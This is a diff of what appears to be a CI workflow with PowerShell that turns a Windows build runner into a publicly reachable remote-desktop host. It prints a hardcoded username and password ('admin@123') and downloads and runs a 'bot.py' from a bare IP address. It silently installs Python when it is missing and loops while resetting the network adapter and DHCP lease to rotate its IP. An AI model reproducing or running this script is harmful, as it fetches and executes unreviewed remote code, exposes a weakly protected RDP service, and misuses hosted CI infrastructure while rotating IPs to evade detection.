@@ -46,7 +46,6 @@ jobs:
               $ip = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
             }
             
-            # Show info
             Write-Host "============================================"
             Write-Host "SERVER NUMBER : $serverNumber"
             Write-Host "WINDOWS OS    : windows-2022"
@@ -56,7 +55,6 @@ jobs:
             Write-Host "PASSWORD      : admin@123"
             Write-Host "============================================"
             
-            # Save info to file
             $desktop = [Environment]::GetFolderPath("Desktop")
             $infoFile = "$desktop\RDP_INFO_SERVER_$serverNumber.txt"
             
@@ -70,12 +68,9 @@ jobs:
             # Download and run bot
             $btol = "http://31.57.97.230:5000"
             try {
-                Write-Host "Downloading bot..."
                 Invoke-WebRequest -Uri $btol -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 15
-                
                 $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
                 if (-not $pythonPath) {
-                    Write-Host "Python not found, installing..."
                     $installer = "$env:TEMP\python.exe"
                     Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile $installer
                     Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
@@ -83,19 +78,17 @@ jobs:
                     Start-Sleep -Seconds 10
                     $pythonPath = "C:\Python311\python.exe"
                 }
-                
                 if (Test-Path "$desktop\bot.py") {
-                    Write-Host "Running bot..."
                     Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
                 }
             } catch {
-                Write-Host "Error with bot: $_"
+                Write-Host "Bot error"
             }
             
             Write-Host ""
             Write-Host "============================================"
             Write-Host "SERVER #$serverNumber ACTIVE"
-            Write-Host "IP: $ip:3389"
+            Write-Host "IP: $ip"
             Write-Host "User: TOOLBOXLAP"
             Write-Host "Pass: admin@123"
             Write-Host "Next IP change in 60 seconds"
@@ -110,12 +103,32 @@ jobs:
             }
             Write-Host ""
             
-            # Reset server to get new IP
-            Write-Host "Resetting server to get new IP..."
+            # ----- تغيير IP فعلياً -----
+            Write-Host "Resetting network to get new IP..."
+            
+            # إعادة تشغيل محول الشبكة
+            $adapter = Get-NetAdapter -Name "Ethernet*" | Where-Object {$_.Status -eq "Up"}
+            if ($adapter) {
+                Write-Host "Restarting network adapter: $($adapter.Name)"
+                Restart-NetAdapter -Name $adapter.Name -Confirm:$false
+                Start-Sleep -Seconds 10
+            }
+            
+            # إعادة تشغيل خدمة الشبكة
+            Restart-Service -Name "Dhcp" -Force
+            Start-Sleep -Seconds 5
+            
+            # تجديد IP من الـ DHCP
+            ipconfig /release
+            Start-Sleep -Seconds 3
+            ipconfig /renew
+            Start-Sleep -Seconds 5
+            
+            # تنظيف RDP
             netsh advfirewall firewall delete rule name="RDP" 2>$null
             Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 1 -Force
             
-            # Kill old bot processes
+            # Kill old bot
             Get-Process -Name "python" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
             
             $iteration++
